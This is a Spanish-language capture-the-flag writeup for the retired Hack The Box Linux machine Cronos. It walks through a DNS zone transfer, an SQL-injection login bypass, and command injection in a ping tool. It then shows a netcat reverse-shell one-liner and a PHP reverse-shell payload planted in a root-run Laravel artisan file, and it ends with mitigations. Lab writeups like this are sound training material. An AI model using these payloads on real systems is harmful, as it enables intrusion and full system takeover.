---
machine: Cronos
os: Linux
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, dns, sqli, command-injection, cron, laravel]
---

# Cronos — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Transferencia de zona en el 53 que revela `admin.cronos.htb`. El panel de administración cae con un bypass SQL trivial y expone una utilidad de `ping` con inyección de comandos: reverse shell como `www-data`. La escalada es una tarea de cron de root que ejecuta `php artisan schedule:run`, y el `artisan` de Laravel es escribible por `www-data`.

## Reconocimiento

```bash
nmap -sC -sV -p- <IP> -oN nmap.txt
```

```text
22/tcp  ssh   OpenSSH 7.2p2 Ubuntu
53/tcp  dns   ISC BIND 9.10.3-P4-Ubuntu
80/tcp  http  Apache httpd 2.4.18
```

## Enumeración

```bash
dig axfr @<IP> cronos.htb
```

```text
cronos.htb.       604800 IN A <IP>
admin.cronos.htb. 604800 IN A <IP>
www.cronos.htb.   604800 IN A <IP>
```

```bash
echo "<IP> cronos.htb admin.cronos.htb www.cronos.htb" | sudo tee -a /etc/hosts
```

`admin.cronos.htb` sirve un panel de login (Laravel). `www.cronos.htb` es la página de la empresa.

## Foothold

El login no sanea la consulta:

```text
usuario: admin' or 1=1-- -
password: cualquiera
```

Dentro hay una herramienta de red que hace `ping` a una IP. El campo se pasa a `shell_exec` sin escapes:

```text
127.0.0.1; id
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Reverse shell:

```bash
# en la víctima, por el campo vulnerable
127.0.0.1; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 4444 >/tmp/f
```

```bash
nc -lvnp 4444
```

## Escalada

```bash
cat /etc/crontab; ls -l /var/www/laravel/artisan
```

```text
* * * * * root php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
-rwxrwxrwx 1 www-data www-data 1339 artisan
```

`artisan` es el punto de entrada de Laravel y está en `777`: se puede reescribir. Se le añade un payload al principio para que el cron de root lo ejecute cada minuto:

```php
<?php
$sock = fsockopen("<IP>", 5555);
exec("/bin/sh -i <&3 >&3 2>&3");
```

```bash
nc -lvnp 5555
```

```text
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Evidencia (redactada)

```text
/var/www/html/user.txt -> <user_flag>
/root/root.txt         -> <root_flag>
```

## Lecciones

- Un AXFR abierto regala la superficie: subdominios de administración incluidos.
- Concatenar entrada de usuario en comandos de sistema (`ping $ip`) es RCE; se resuelve con `escapeshellarg` y listas de validación.
- Permisos `777` en el entrypoint de un framework con un cron de root convierten una web comprometida en root en un minuto.
- Mitigación: `bind` restringido a transferencias autorizadas, prepared statements, y `artisan` en `644 root:root` con el cron apuntando a un wrapper de solo lectura.
